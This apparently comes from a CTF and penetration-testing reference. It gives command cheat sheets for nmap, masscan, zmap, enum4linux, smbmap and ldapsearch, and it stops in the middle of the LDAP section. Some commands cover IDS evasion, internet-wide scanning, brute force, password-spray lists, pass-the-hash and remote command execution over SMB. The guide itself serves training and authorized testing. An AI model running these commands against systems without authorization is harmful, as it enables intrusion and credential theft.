### Scanning

Network scanning is the reconnaissance phase of penetration testing, identifying live hosts, open ports, running services, and potential vulnerabilities. These tools form the foundation of any CTF or penetration testing engagement.

#### Nmap (Network Mapper)

Nmap is the industry-standard network scanning tool, offering comprehensive host discovery, port scanning, service enumeration, and vulnerability detection capabilities.

**Basic Host Discovery**

```bash
# Ping sweep - identify live hosts
nmap -sn 192.168.1.0/24
nmap -sn 10.10.10.0/24

# ARP scan (local network only, requires root)b
nmap -PR 192.16b8.1.0/24

# Disable ping (scan even if host appears down)
nmap -Pn 192.168.1.10

# TCP SYN ping
nmap -PS22,80,443 192.168.1.0/24

# TCP ACK ping
nmap -PA80,443 192.168.1.0/24

# UDP ping
nmap -PU53,161 192.168.1.0/24

# ICMP echo, timestamp, and netmask requests
nmap -PE -PP -PM 192.168.1.0/24

# List scan - simply list targets without scanning
nmap -sL 192.168.1.0/24
```

**Port Scanning Techniques**

```bash
# TCP SYN scan (default, stealthy, requires root)
nmap -sS 192.168.1.10

# TCP Connect scan (no root required)
nmap -sT 192.168.1.10

# UDP scan (slow but important)
nmap -sU 192.168.1.10

# Combined TCP and UDP
nmap -sS -sU 192.168.1.10

# Scan specific ports
nmap -p 22,80,443 192.168.1.10
nmap -p 1-1000 192.168.1.10

# Scan all 65535 ports
nmap -p- 192.168.1.10

# Fast scan (top 100 ports)
nmap -F 192.168.1.10

# Scan top N ports
nmap --top-ports 1000 192.168.1.10

# TCP NULL scan (firewall evasion)
nmap -sN 192.168.1.10

# TCP FIN scan (firewall evasion)
nmap -sF 192.168.1.10

# TCP Xmas scan (firewall evasion)
nmap -sX 192.168.1.10

# TCP ACK scan (firewall rule detection)
nmap -sA 192.168.1.10

# TCP Window scan
nmap -sW 192.168.1.10

# TCP Maimon scan
nmap -sM 192.168.1.10
```

**Service and Version Detection**

```bash
# Service version detection
nmap -sV 192.168.1.10

# Aggressive version detection
nmap -sV --version-intensity 9 192.168.1.10

# Light version detection (faster)
nmap -sV --version-intensity 0 192.168.1.10

# OS detection
nmap -O 192.168.1.10

# Aggressive scan (OS detection, version detection, script scanning, traceroute)
nmap -A 192.168.1.10

# Detect service info even on unusual ports
nmap -sV --version-all 192.168.1.10
```

**NSE (Nmap Scripting Engine)**

```bash
# Default scripts (safe and useful)
nmap -sC 192.168.1.10
nmap --script=default 192.168.1.10

# Vulnerability scanning scripts
nmap --script vuln 192.168.1.10

# Authentication testing
nmap --script auth 192.168.1.10

# Brute force attacks
nmap --script brute 192.168.1.10

# Discovery scripts
nmap --script discovery 192.168.1.10

# Exploit scripts
nmap --script exploit 192.168.1.10

# Specific script execution
nmap --script=http-enum 192.168.1.10
nmap --script=smb-enum-shares 192.168.1.10
nmap --script=ssh-brute 192.168.1.10

# Multiple scripts
nmap --script=http-enum,http-headers,http-methods 192.168.1.10

# Script with arguments
nmap --script=http-enum --script-args http-enum.basepath=/admin/ 192.168.1.10

# List available scripts
nmap --script-help vuln
ls /usr/share/nmap/scripts/

# Update script database
nmap --script-updatedb
```

**Common NSE Scripts for CTF**

```bash
# HTTP enumeration
nmap -p 80,443 --script=http-enum,http-headers,http-methods,http-robots.txt 192.168.1.10

# SMB enumeration
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.1.10

# SMB vulnerabilities (EternalBlue, etc.)
nmap -p 445 --script=smb-vuln-* 192.168.1.10

# FTP enumeration
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-proftpd-backdoor 192.168.1.10

# SSH enumeration
nmap -p 22 --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos 192.168.1.10

# DNS enumeration
nmap -p 53 --script=dns-zone-transfer,dns-recursion 192.168.1.10

# SMTP enumeration
nmap -p 25 --script=smtp-commands,smtp-enum-users,smtp-open-relay 192.168.1.10

# MySQL enumeration
nmap -p 3306 --script=mysql-info,mysql-empty-password,mysql-users 192.168.1.10

# MSSQL enumeration
nmap -p 1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-dump-hashes 192.168.1.10

# RDP enumeration
nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 192.168.1.10

# SSL/TLS analysis
nmap -p 443 --script=ssl-enum-ciphers,ssl-cert,ssl-heartbleed 192.168.1.10
```

**Timing and Performance**

```bash
# Timing templates (-T0 to -T5)
nmap -T0 192.168.1.10  # Paranoid (IDS evasion)
nmap -T1 192.168.1.10  # Sneaky (IDS evasion)
nmap -T2 192.168.1.10  # Polite (less bandwidth)
nmap -T3 192.168.1.10  # Normal (default)
nmap -T4 192.168.1.10  # Aggressive (fast, common in CTF)
nmap -T5 192.168.1.10  # Insane (very fast, may miss results)

# Parallel host scanning
nmap --min-hostgroup 50 --max-hostgroup 100 192.168.1.0/24

# Parallel port scanning
nmap --min-parallelism 10 --max-parallelism 100 192.168.1.10

# Timing parameters
nmap --min-rtt-timeout 100ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms 192.168.1.10

# Scan delay (for rate limiting)
nmap --scan-delay 1s 192.168.1.10
nmap --max-scan-delay 10s 192.168.1.10

# Maximum retries
nmap --max-retries 2 192.168.1.10
```

**Firewall and IDS Evasion**

```bash
# Fragment packets
nmap -f 192.168.1.10

# Specify MTU (must be multiple of 8)
nmap --mtu 24 192.168.1.10

# Decoy scanning (hide among decoys)
nmap -D RND:10 192.168.1.10
nmap -D 192.168.1.5,192.168.1.6,ME,192.168.1.7 192.168.1.10

# Idle/Zombie scan (very stealthy)
nmap -sI zombie_host:port target_host

# Source port manipulation
nmap --source-port 53 192.168.1.10
nmap -g 53 192.168.1.10

# Append random data to packets
nmap --data-length 25 192.168.1.10

# Spoof MAC address
nmap --spoof-mac 0 192.168.1.10  # Random MAC
nmap --spoof-mac Apple 192.168.1.10  # Vendor-specific
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.10  # Specific MAC

# Randomize target order
nmap --randomize-hosts 192.168.1.0/24

# Bad checksum (some systems may respond differently)
nmap --badsum 192.168.1.10
```

**Output Options**

```bash
# Normal output to file
nmap -oN scan.txt 192.168.1.10

# XML output (for parsing)
nmap -oX scan.xml 192.168.1.10

# Grepable output
nmap -oG scan.gnmap 192.168.1.10

# All formats
nmap -oA scan 192.168.1.10

# Append to file
nmap --append-output -oN scan.txt 192.168.1.10

# Verbose output
nmap -v 192.168.1.10
nmap -vv 192.168.1.10  # Very verbose

# Debug output
nmap -d 192.168.1.10
nmap -dd 192.168.1.10  # More debug info

# Show reason for port state
nmap --reason 192.168.1.10

# Show open ports only
nmap --open 192.168.1.10

# Packet trace
nmap --packet-trace 192.168.1.10
```

**Advanced Nmap Usage**

```bash
# Complete CTF reconnaissance scan
nmap -p- -sV -sC -T4 -A --open -oA full_scan 192.168.1.10

# Fast initial scan
nmap -T4 -F --open 192.168.1.10

# Detailed service scan of discovered ports
nmap -p 22,80,443,3306 -sV --version-intensity 9 -sC -A 192.168.1.10

# Scan multiple targets from file
nmap -iL targets.txt

# Exclude targets
nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.254
nmap 192.168.1.0/24 --excludefile exclude.txt

# IPv6 scanning
nmap -6 fe80::1

# Resume interrupted scan
nmap --resume scan.gnmap

# Read from pcap file
nmap --packet-trace --send-ip 192.168.1.10
```

**Practical CTF Scanning Workflow**

```bash
# Step 1: Quick host discovery
nmap -sn 10.10.10.0/24 -oG hosts.txt

# Step 2: Parse live hosts
grep "Status: Up" hosts.txt | cut -d' ' -f2 > live_hosts.txt

# Step 3: Fast port scan on live hosts
nmap -iL live_hosts.txt -T4 --top-ports 1000 --open -oA fast_scan

# Step 4: Full port scan on discovered hosts
nmap -iL live_hosts.txt -p- -T4 --open -oA full_port_scan

# Step 5: Service and version detection on open ports
nmap -iL live_hosts.txt -sV -sC -A -T4 --open -oA detailed_scan

# Step 6: Vulnerability scanning
nmap -iL live_hosts.txt --script vuln -oA vuln_scan
```

#### Masscan

Masscan is the fastest port scanner, capable of scanning the entire Internet in under 6 minutes. It's ideal for rapid initial reconnaissance of large networks.

**Basic Usage**

```bash
# Basic port scan
masscan 192.168.1.0/24 -p 80,443

# Scan specific ports
masscan 10.10.10.0/24 -p 22,80,443,8080,8443

# Scan port range
masscan 192.168.1.0/24 -p 1-1000

# Scan all ports
masscan 192.168.1.0/24 -p 0-65535

# Scan single host
masscan 192.168.1.10 -p 1-65535

# Top ports (similar to nmap)
masscan 192.168.1.0/24 --top-ports 100
```

**Rate Control**

```bash
# Set packet rate (packets per second)
masscan 192.168.1.0/24 -p 80,443 --rate 1000

# Maximum rate (default is 100 packets/sec)
masscan 192.168.1.0/24 -p 1-65535 --rate 10000

# Conservative rate for stealth
masscan 192.168.1.0/24 -p 80,443 --rate 100

# Aggressive rate for speed
masscan 10.0.0.0/8 -p 80,443 --rate 100000

# Unlimited rate (use with caution)
masscan 192.168.1.0/24 -p 80 --rate 10000000
```

**Output Options**

```bash
# List format (default)
masscan 192.168.1.0/24 -p 80,443 -oL output.txt

# XML format
masscan 192.168.1.0/24 -p 80,443 -oX output.xml

# Grepable format
masscan 192.168.1.0/24 -p 80,443 -oG output.gnmap

# JSON format
masscan 192.168.1.0/24 -p 80,443 -oJ output.json

# Binary format (for later parsing)
masscan 192.168.1.0/24 -p 80,443 -oB output.bin

# Multiple output formats
masscan 192.168.1.0/24 -p 80,443 -oL list.txt -oX scan.xml -oJ scan.json
```

**Advanced Features**

```bash
# Banner grabbing
masscan 192.168.1.0/24 -p 80,443 --banners

# Banner grabbing with rate limit
masscan 192.168.1.0/24 -p 80,443,8080 --banners --rate 1000

# Exclude IP ranges
masscan 192.168.1.0/24 -p 80 --exclude 192.168.1.1-192.168.1.10

# Exclude file
masscan 192.168.1.0/24 -p 80 --excludefile exclude.txt

# Include file (scan only these IPs)
masscan --includefile targets.txt -p 80,443

# Source IP specification (IP spoofing)
masscan 192.168.1.0/24 -p 80 -S 192.168.1.100

# Source port specification
masscan 192.168.1.0/24 -p 80 --source-port 61234

# Interface specification
masscan 192.168.1.0/24 -p 80 -e eth0

# Router MAC address (for routing)
masscan 192.168.1.0/24 -p 80 --router-mac 11:22:33:44:55:66

# Wait time for responses
masscan 192.168.1.0/24 -p 80 --wait 5

# Connection timeout
masscan 192.168.1.0/24 -p 80 --connection-timeout 30
```

**Configuration File Usage**

```bash
# Create configuration file
cat > masscan.conf << 'EOF'
rate = 10000
output-filename = results.txt
output-format = list
ports = 80,443,8080,8443
range = 192.168.1.0/24
EOF

# Use configuration file
masscan -c masscan.conf

# Override config file parameters
masscan -c masscan.conf --rate 5000
```

**Masscan with Nmap Integration**

[Inference] A common CTF strategy is using masscan for fast initial discovery, then nmap for detailed enumeration:

```bash
# Step 1: Fast discovery with masscan
masscan 10.10.10.0/24 -p 1-65535 --rate 10000 -oL masscan_results.txt

# Step 2: Parse results to extract IPs and ports
cat masscan_results.txt | grep "open" | awk '{print $4":"$3}' | sed 's/\/.*//g' > targets.txt

# Step 3: Use nmap for detailed scanning
# Parse into format: IP1 -p PORT1,PORT2 ; IP2 -p PORT3,PORT4
awk -F: '{a[$1]=a[$1]","$2} END {for(i in a) print i" -p "substr(a[i],2)}' targets.txt > nmap_targets.txt

# Step 4: Run nmap on discovered open ports
while read line; do
    nmap -sV -sC $line -oA nmap_$(echo $line | awk '{print $1}')
done < nmap_targets.txt
```

**Practical Masscan Examples**

```bash
# Scan entire subnet for web servers
masscan 192.168.1.0/24 -p 80,443,8080,8443,8000 --rate 5000 -oL web_servers.txt

# Find SSH servers in network
masscan 10.10.0.0/16 -p 22 --rate 10000 -oL ssh_servers.txt

# Scan specific service ports across large range
masscan 172.16.0.0/12 -p 21,22,23,25,80,110,443,445,3306,3389 --rate 20000 -oL services.txt

# Banner grab from discovered hosts
masscan 192.168.1.0/24 -p 80,443 --banners --rate 1000 -oL banners.txt

# Quick check for specific vulnerability port
masscan 10.0.0.0/8 -p 445 --rate 50000 -oL smb_hosts.txt
```

**Masscan Optimization Tips**

```bash
# Use appropriate rates based on network capacity
# LAN: --rate 10000-100000
# WAN: --rate 1000-10000
# Internet: --rate 100-1000

# For CTF environments (typically LAN)
masscan 192.168.1.0/24 -p 1-65535 --rate 50000

# For external reconnaissance
masscan target.com -p 1-65535 --rate 1000

# Reduce false positives with wait time
masscan 192.168.1.0/24 -p 80,443 --wait 3

# Resume interrupted scan
masscan --resume paused.conf
```

#### Zmap

Zmap is designed for Internet-wide network surveys, optimized for scanning single ports across large address spaces at high speed.

**Basic Usage**

```bash
# Scan single port across subnet
zmap -p 80 192.168.1.0/24

# Scan with output file
zmap -p 443 10.10.10.0/24 -o results.txt

# Specify bandwidth (in bits per second)
zmap -p 80 192.168.1.0/24 -B 10M

# Specify probe rate (packets per second)
zmap -p 80 192.168.1.0/24 -r 1000
```

**Output Options**

```bash
# Output fields specification
zmap -p 80 192.168.1.0/24 -f "saddr,sport,daddr,dport" -o output.txt

# CSV output with specific fields
zmap -p 443 192.168.1.0/24 -f "saddr,daddr,sport,dport,timestamp-str" -O csv -o scan.csv

# JSON output
zmap -p 80 192.168.1.0/24 -O json -o scan.json

# Extended output fields
zmap -p 80 192.168.1.0/24 -f "saddr,daddr,sport,dport,seqnum,acknum,window,classification,success" -o detailed.txt

# Output only successful responses
zmap -p 80 192.168.1.0/24 -f "saddr" --output-filter="success = 1" -o successful.txt
```

**Network Configuration**

```bash
# Specify source IP
zmap -p 80 -S 192.168.1.100 192.168.1.0/24

# Specify network interface
zmap -p 80 -i eth0 192.168.1.0/24

# Specify gateway MAC address
zmap -p 80 -G 00:11:22:33:44:55 192.168.1.0/24

# Specify source port
zmap -p 80 -s 54321 192.168.1.0/24
```

**Scanning Options**

```bash
# TCP SYN scan (default)
zmap -p 80 192.168.1.0/24

# ICMP echo request scan
zmap --probe-module=icmp_echoscan 192.168.1.0/24

# UDP scan
zmap --probe-module=udp -p 53 192.168.1.0/24

# List available probe modules
zmap --list-probe-modules

# TCP SYN-ACK scan
zmap --probe-module=tcp_synscan -p 80 192.168.1.0/24

# Scan with specific TTL
zmap -p 80 -T 64 192.168.1.0/24

# Randomize scan order (default)
zmap -p 80 192.168.1.0/24

# Disable randomization (scan sequentially)
zmap -p 80 --seed=0 192.168.1.0/24
```

**Filtering and Blacklisting**

```bash
# Blacklist file (IPs to exclude)
echo "192.168.1.1" > blacklist.txt
echo "192.168.1.254" >> blacklist.txt
zmap -p 80 192.168.1.0/24 -b blacklist.txt

# Whitelist file (only scan these IPs)
zmap -p 80 -w whitelist.txt

# Output filter (filter results)
zmap -p 80 192.168.1.0/24 --output-filter="success = 1 && repeat = 0"
```

**Performance Tuning**

```bash
# Set bandwidth limit (10 Mbps)
zmap -p 80 192.168.1.0/24 -B 10M

# Set packet rate (1000 packets/sec)
zmap -p 80 192.168.1.0/24 -r 1000

# Set number of probes (default 1)
zmap -p 80 192.168.1.0/24 -P 3

# Cooldown time after scan completes (seconds)
zmap -p 80 192.168.1.0/24 -c 10

# Maximum targets to scan
zmap -p 80 192.168.1.0/24 -n 1000

# Maximum runtime (seconds)
zmap -p 80 192.168.1.0/24 -t 300

# Sender threads (default 1)
zmap -p 80 192.168.1.0/24 --sender-threads=4
```

**Metadata and Logging**

```bash
# Log file
zmap -p 80 192.168.1.0/24 -L scan.log

# Log directory
zmap -p 80 192.168.1.0/24 --log-directory=/var/log/zmap/

# Metadata file (scan statistics)
zmap -p 80 192.168.1.0/24 -m metadata.json

# Status updates during scan
zmap -p 80 192.168.1.0/24 --status-updates-file=status.txt

# Verbose output
zmap -p 80 192.168.1.0/24 -v

# Quiet mode (minimal output)
zmap -p 80 192.168.1.0/24 -q
```

**Advanced Zmap Usage**

```bash
# Configuration file
cat > zmap.conf << 'EOF'
interface = eth0
bandwidth = 10M
rate = 1000
output-file = results.txt
target-port = 80
EOF

zmap -C zmap.conf 192.168.1.0/24

# Multiple probe types for same target
zmap --probe-module=tcp_synscan -p 80 192.168.1.0/24 -o tcp_results.txt
zmap --probe-module=icmp_echoscan 192.168.1.0/24 -o icmp_results.txt

# Scan with specific output fields for analysis
zmap -p 443 192.168.1.0/24 -f "saddr,sport,daddr,dport,classification,success,repeat,cooldown,timestamp-str" -o detailed_scan.csv
```

**Zmap with ZGrab Integration**

[Inference] Zmap is often used with ZGrab (or ZGrab2) for banner grabbing and application-layer data collection:

```bash
# Install zgrab2
go get github.com/zmap/zgrab2

# Step 1: Scan for open ports with zmap
zmap -p 443 192.168.1.0/24 -o https_hosts.txt

# Step 2: Use zgrab2 to grab banners
cat https_hosts.txt | zgrab2 https --port 443 -o https_banners.json

# Alternative: Single command pipeline
zmap -p 80 192.168.1.0/24 | zgrab2 http --port 80 -o http_results.json
```

**Practical Zmap Examples for CTF**

```bash
# Find all web servers in network
zmap -p 80 10.10.10.0/24 -o web_servers.txt
zmap -p 443 10.10.10.0/24 -o https_servers.txt

# Fast SSH server discovery
zmap -p 22 172.16.0.0/12 -r 5000 -o ssh_hosts.txt

# Database server discovery
zmap -p 3306 192.168.0.0/16 -o mysql_hosts.txt
zmap -p 5432 192.168.0.0/16 -o postgresql_hosts.txt

# SMB/CIFS discovery
zmap -p 445 10.0.0.0/8 -r 10000 -o smb_hosts.txt

# Scan common vulnerable ports rapidly
for port in 21 22 23 80 135 139 443 445 3389; do
    zmap -p $port 192.168.1.0/24 -o port_${port}.txt
done
```

**Comparing Scanner Outputs**

```bash
# Zmap outputs IPs only
zmap -p 80 192.168.1.0/24 -o zmap_results.txt

# Convert to format for further processing
cat zmap_results.txt | while read ip; do
    echo "$ip:80"
done > targets_with_ports.txt

# Feed to nmap for detailed scan
cat zmap_results.txt | while read ip; do
    nmap -sV -p 80 $ip -oA nmap_$ip
done
```

#### Scanner Comparison and Use Cases

**Performance Comparison**

| Scanner | Speed     | Stealth | Detail    | Best Use Case                           |
| ------- | --------- | ------- | --------- | --------------------------------------- |
| Nmap    | Moderate  | High    | Very High | Detailed enumeration, service detection |
| Masscan | Very High | Low     | Low       | Rapid large network discovery           |
| Zmap    | Extreme   | Low     | Very Low  | Internet-scale single-port surveys      |

**When to Use Each Tool**

```bash
# CTF Initial Reconnaissance Workflow

# 1. Fast initial discovery (Masscan)
masscan 10.10.10.0/24 -p 1-65535 --rate 10000 -oL masscan_all.txt

# 2. Parse for open ports
grep "open" masscan_all.txt | awk '{print $4":"$3}' | sed 's/\/tcp//' > discovered.txt

# 3. Detailed enumeration (Nmap)
# Group by IP and create port list
awk -F: '{ports[$1]=ports[$1]","$2} END {for (ip in ports) print ip " -p " substr(ports[ip],2)}' discovered.txt > nmap_commands.txt

# 4. Run detailed nmap scans
while read line; do
    nmap -sV -sC -A $line -oA nmap_$(echo $line | awk '{print $1}')
done < nmap_commands.txt

# Alternative for specific service (Zmap + Nmap)
# Find all web servers quickly
zmap -p 80 10.10.10.0/24 -o web_hosts.txt

# Detailed web enumeration
cat web_hosts.txt | while read ip; do
    nmap -p 80 -sV --script http-enum,http-headers,http-methods $ip
done
```

**Stealth Considerations**

```bash
# Stealthy scan (Nmap)
nmap -sS -T2 -f --randomize-hosts --data-length 25 -D RND:10 192.168.1.10

# Aggressive fast scan (Masscan for CTF)
masscan 192.168.1.0/24 -p 1-65535 --rate 50000 -oL fast_results.txt

# Internet-wide reconnaissance (Zmap)
# [Unverified] Use with caution and proper authorization
zmap -p 80 0.0.0.0/0 -B 1G -o internet_scan.txt
```

**Output Processing**

```bash
# Parse Nmap XML output
cat scan.xml | grep "open" | grep "portid" | cut -d'"' -f4,6 | sed 's/"/ /'

# Parse Masscan JSON output
jq -r '.[] | "\(.ip):\(.ports[].port)"' masscan_output.json

# Parse Zmap output for further processing
awk '{print $1}' zmap_output.txt | sort -u > unique_ips.txt

# Combine results from multiple scanners
cat masscan_results.txt zmap_results.txt | sort -u > combined_targets.txt
```

#### Important Related Topics

**Critical subtopics for comprehensive scanning knowledge:**
- **Service enumeration techniques** - Deep-dive into HTTP, SMB, FTP, SSH, and database enumeration
- **Vulnerability scanning** - Using OpenVAS, Nessus, and Nmap NSE for automated vulnerability detection
- **Firewall and IDS evasion** - Advanced packet manipulation and timing techniques
- **IPv6 scanning** - Techniques specific to IPv6 networks and their unique challenges
- **Banner grabbing and fingerprinting** - Application-layer reconnaissance techniques

---

### Enumeration

Enumeration is the process of extracting detailed information about network services, users, shares, and configurations after initial scanning. These tools focus on gathering actionable intelligence from specific services.

#### Enum4linux

Enum4linux is a tool for enumerating information from Windows and Samba systems via SMB (Server Message Block). It's essentially a wrapper around Samba tools like smbclient, rpcclient, net, and nmblookup.

**Basic Usage**

```bash
# Basic enumeration
enum4linux 192.168.1.10

# Target specific host
enum4linux -a 192.168.1.10

# With credentials
enum4linux -u administrator -p password 192.168.1.10

# Null session enumeration (anonymous)
enum4linux -N 192.168.1.10
```

**Specific Enumeration Options**

```bash
# User enumeration
enum4linux -U 192.168.1.10

# Share enumeration
enum4linux -S 192.168.1.10

# Group enumeration
enum4linux -G 192.168.1.10

# Password policy enumeration
enum4linux -P 192.168.1.10

# OS information
enum4linux -o 192.168.1.10

# Printer information
enum4linux -i 192.168.1.10

# Get domain SID
enum4linux -r 192.168.1.10

# RID cycling (enumerate users via RID)
enum4linux -R 500-550 192.168.1.10

# Enumerate all with RID cycling
enum4linux -a -R 500-1000 192.168.1.10
```

**Advanced Options**

```bash
# Specify username for enumeration
enum4linux -u "guest" -p "" -U 192.168.1.10

# Use specific workgroup
enum4linux -w WORKGROUP -U 192.168.1.10

# Verbose output
enum4linux -v -a 192.168.1.10

# Get detailed user info
enum4linux -U -v 192.168.1.10

# Comprehensive enumeration with credentials
enum4linux -u "admin" -p "password" -U -S -G -P -r -o -n 192.168.1.10

# Machine list enumeration
enum4linux -M 192.168.1.10

# Enumerate shares and list contents
enum4linux -S -s /tmp/shares.txt 192.168.1.10

# RID cycling with large range
enum4linux -R 1000-2000 192.168.1.10
```

**Parsing Enum4linux Output**

```bash
# Run enumeration and save output
enum4linux -a 192.168.1.10 | tee enum4linux_output.txt

# Extract usernames
grep "user:" enum4linux_output.txt | cut -d "[" -f2 | cut -d "]" -f1

# Extract share names
grep "Sharename" enum4linux_output.txt | awk '{print $1}'

# Extract groups
grep "Group" enum4linux_output.txt | grep -v "Getting" | cut -d "[" -f2 | cut -d "]" -f1

# Find writable shares
grep "Mapping" enum4linux_output.txt | grep "WRITE"
```

**Practical Enum4linux Workflow**

```bash
# Step 1: Try null session first
enum4linux -N -U -S -G 192.168.1.10 > null_session.txt

# Step 2: If null session fails, try with credentials
enum4linux -u "guest" -p "" -a 192.168.1.10 > guest_enum.txt

# Step 3: RID cycling for user discovery
enum4linux -R 500-3000 192.168.1.10 > rid_cycling.txt

# Step 4: Parse discovered users
cat rid_cycling.txt | grep "user:" | cut -d "[" -f2 | cut -d "]" -f1 > users.txt

# Step 5: Create password spray list
cat users.txt | while read user; do
    echo "$user:Password123"
done > spray_list.txt
```

**Enum4linux-ng (Modern Alternative)**

[Inference] Enum4linux-ng is a rewrite of enum4linux in Python with additional features and better output formatting:

```bash
# Install enum4linux-ng
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Basic usage
./enum4linux-ng.py 192.168.1.10

# All checks
./enum4linux-ng.py -A 192.168.1.10

# With credentials
./enum4linux-ng.py -u "admin" -p "password" -A 192.168.1.10

# JSON output
./enum4linux-ng.py -A 192.168.1.10 -oJ output.json

# YAML output
./enum4linux-ng.py -A 192.168.1.10 -oY output.yaml

# Specify timeout
./enum4linux-ng.py -A 192.168.1.10 -t 30
```

#### Smbmap

Smbmap allows enumeration of SMB shares and their permissions across a domain. It's particularly useful for identifying accessible shares and potential privilege escalation paths.

**Basic Usage**

```bash
# List shares with guest access
smbmap -H 192.168.1.10

# Null session enumeration
smbmap -H 192.168.1.10 -u null -p ""

# Anonymous login
smbmap -H 192.168.1.10 -u anonymous

# With credentials
smbmap -H 192.168.1.10 -u username -p password

# Domain authentication
smbmap -H 192.168.1.10 -d DOMAIN -u username -p password

# Using hash (pass-the-hash)
smbmap -H 192.168.1.10 -u username -p 'LMHASH:NTHASH'
```

**Share Enumeration**

```bash
# List all shares
smbmap -H 192.168.1.10 -u username -p password

# Recursive listing of share contents
smbmap -H 192.168.1.10 -u username -p password -R

# List specific share recursively
smbmap -H 192.168.1.10 -u username -p password -R 'Share_Name'

# Show permissions (READ/WRITE)
smbmap -H 192.168.1.10 -u username -p password -r

# Search for specific file patterns
smbmap -H 192.168.1.10 -u username -p password -R --pattern '*.txt'
smbmap -H 192.168.1.10 -u username -p password -R --pattern '*.xml'
smbmap -H 192.168.1.10 -u username -p password -R --pattern 'password*'

# Exclude specific patterns
smbmap -H 192.168.1.10 -u username -p password -R --exclude 'uninteresting'

# Search in specific directory
smbmap -H 192.168.1.10 -u username -p password -R 'ShareName' -A 'GroupName'
```

**File Operations**

```bash
# Download file
smbmap -H 192.168.1.10 -u username -p password --download 'Share\path\to\file.txt'

# Upload file
smbmap -H 192.168.1.10 -u username -p password --upload '/local/file.txt' 'Share\remote\file.txt'

# Delete file
smbmap -H 192.168.1.10 -u username -p password --delete 'Share\path\to\file.txt'

# List directory contents
smbmap -H 192.168.1.10 -u username -p password -r 'Share'
```

**Command Execution**

```bash
# Execute command
smbmap -H 192.168.1.10 -u username -p password -x 'whoami'

# Execute PowerShell command
smbmap -H 192.168.1.10 -u username -p password -x 'powershell.exe -c Get-Process'

# Execute command and save output
smbmap -H 192.168.1.10 -u username -p password -x 'ipconfig' > output.txt

# Multiple commands
smbmap -H 192.168.1.10 -u username -p password -x 'whoami && hostname && ipconfig'
```

**Scanning Multiple Hosts**

```bash
# Scan from file
smbmap -H targets.txt -u username -p password

# Scan subnet (requires host file)
echo "192.168.1.0/24" | smbmap -u username -p password

# Scan with different credentials per host
cat hosts.txt | while read host; do
    smbmap -H $host -u username -p password
done
```

**Advanced Options**

```bash
# Specify SMB port (non-standard)
smbmap -H 192.168.1.10 -u username -p password -P 4455

# Set depth for recursive listing
smbmap -H 192.168.1.10 -u username -p password -R --depth 3

# Show file sizes and timestamps
smbmap -H 192.168.1.10 -u username -p password -R -A

# Exclude IPC$ share
smbmap -H 192.168.1.10 -u username -p password --exclude-shares IPC$

# Verbose output
smbmap -H 192.168.1.10 -u username -p password -v

# Quiet mode (minimal output)
smbmap -H 192.168.1.10 -u username -p password -q
```

**Practical Smbmap Workflows**

```bash
# CTF Workflow 1: Quick enumeration
# Step 1: Try guest access
smbmap -H 10.10.10.10 -u guest

# Step 2: Try null session
smbmap -H 10.10.10.10 -u null -p ""

# Step 3: If credentials found, enumerate fully
smbmap -H 10.10.10.10 -u username -p password -R --pattern '*.txt' --pattern '*.config' --pattern '*.xml'

# CTF Workflow 2: Finding sensitive files
# Search for interesting file patterns
smbmap -H 10.10.10.10 -u username -p password -R --pattern '*password*'
smbmap -H 10.10.10.10 -u username -p password -R --pattern '*config*'
smbmap -H 10.10.10.10 -u username -p password -R --pattern '*.kdbx'
smbmap -H 10.10.10.10 -u username -p password -R --pattern '*backup*'

# CTF Workflow 3: Automated download
# Find and download all accessible files
smbmap -H 10.10.10.10 -u username -p password -R | grep -v "^$" | grep "\." | while read line; do
    file=$(echo $line | awk '{print $NF}')
    smbmap -H 10.10.10.10 -u username -p password --download "$file" 2>/dev/null
done
```

**Integration with Other Tools**

```bash
# Use smbmap output with smbclient
smbmap -H 192.168.1.10 -u username -p password | grep "READ, WRITE" | awk '{print $1}' | while read share; do
    echo "Accessing $share"
    smbclient //192.168.1.10/$share -U username%password -c 'ls'
done

# Combine with crackmapexec
crackmapexec smb 192.168.1.0/24 -u username -p password --shares
```

#### Ldapsearch

Ldapsearch is the primary tool for querying LDAP (Lightweight Directory Access Protocol) directories, commonly used for Active Directory enumeration.

**Basic LDAP Queries**

```bash
# Anonymous bind (if allowed)
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local"

# Simple authentication
ldapsearch -x -h 192.168.1.10 -D "cn=admin,dc=domain,dc=local" -w password -b "dc=domain,dc=local"

# Search with user credentials
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local"

# Using LDAPS (LDAP over SSL)
ldapsearch -x -H ldaps://192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local"

# Specify LDAP version
ldapsearch -x -h 192.168.1.10 -LLL -D "username@domain.local" -w password -b "dc=domain,dc=local" -v 3
```

**Common LDAP Searches**

```bash
# List all users
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"

# List all groups
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=group)"

# List all computers
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=computer)"

# List organizational units
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=organizationalUnit)"

# Search for specific user
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(sAMAccountName=administrator)"

# Search for users with specific attributes
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)"
```

**Attribute Selection**

```bash
# Return specific attributes only
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Multiple attributes
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName mail description

# All user attributes
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" "*"

# Operational attributes (metadata)
